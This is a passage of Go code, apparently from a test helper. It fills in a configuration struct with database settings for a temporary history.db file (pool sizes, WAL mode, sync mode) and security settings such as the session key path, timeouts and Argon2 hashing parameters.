			Path:         filepath.Join(tmpDir, "data", "history.db"),
			MaxOpenConns: 10,
			MaxIdleConns: 5,
			WALMode:      true,
			SyncMode:     "NORMAL",
		},
		Security: config.SecurityConfig{
			SessionKeyPath:    filepath.Join(tmpDir, "data", "session"),
			SessionTimeout:    30,
			Argon2Time:        3,
			Argon2Memory:      64 * 1024,
			Argon2Threads:     4,
			AutoLockTimeout:   0,
			SecureMemoryClear: true,
		},
	}
}
